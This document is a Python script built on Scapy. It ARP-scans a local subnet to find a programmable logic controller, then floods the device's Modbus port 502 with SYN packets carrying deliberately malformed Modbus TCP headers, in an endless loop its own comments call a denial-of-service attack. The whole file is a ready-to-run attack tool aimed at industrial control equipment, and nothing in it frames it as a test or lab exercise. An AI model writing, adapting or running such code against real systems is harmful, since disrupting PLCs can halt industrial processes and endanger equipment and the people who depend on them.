from scapy.all import ARP, Ether, srp, send
from scapy.layers.inet import IP, TCP
import random

# Discover the PLC IP address using ARP scanning
def discover_plc_ip(subnet="192.168.9.0/24"):
    print("[*] Discovering PLC IP in subnet:", subnet)
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for _, received in answered_list:
        if received.psrc.startswith("192.168.9."):  # Check the known subnet
            print("[+] Found PLC IP Address:", received.psrc)
            return received.psrc
    print("[-] No PLC found in the subnet.")
    return None

# Perform Denial-of-Service (DoS) attack with malformed Modbus requests
def perform_dos_attack(target_ip, port=502):
    print("[*] Initiating DoS attack on PLC @", target_ip, "Port:", port)
    try:
        while True:
            # Generate a malformed Modbus TCP header
            transaction_id = random.randint(0, 65535)
            protocol_id = 0x0000  # Modbus TCP
            length = 0xFFFF  # Malformed length
            unit_id = random.randint(0, 255)

            # Construct the Modbus TCP header
            modbus_request = (
                transaction_id.to_bytes(2, byteorder="big") +  # Transaction ID
                protocol_id.to_bytes(2, byteorder="big") +    # Protocol ID
                length.to_bytes(2, byteorder="big") +         # Length (malformed)
                unit_id.to_bytes(1, byteorder="big")          # Unit ID
            )

            # Send TCP packets to the target device
            ip_packet = IP(dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S") / modbus_request
            send(ip_packet, verbose=False)
            
            print("[*] Malformed packet sent.")
    except KeyboardInterrupt:
        print("\n[!] DoS attack stopped.")

# Main execution logic
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    subnet_to_scan = "192.168.9.0/24"  # Adjust based on your network
    plc_ip = discover_plc_ip(subnet=subnet_to_scan)
    
    if plc_ip:
        # Step 2: Perform the DoS attack
        perform_dos_attack(target_ip=plc_ip)
    else:
        print("[-] Unable to locate PLC in the network. Exiting.")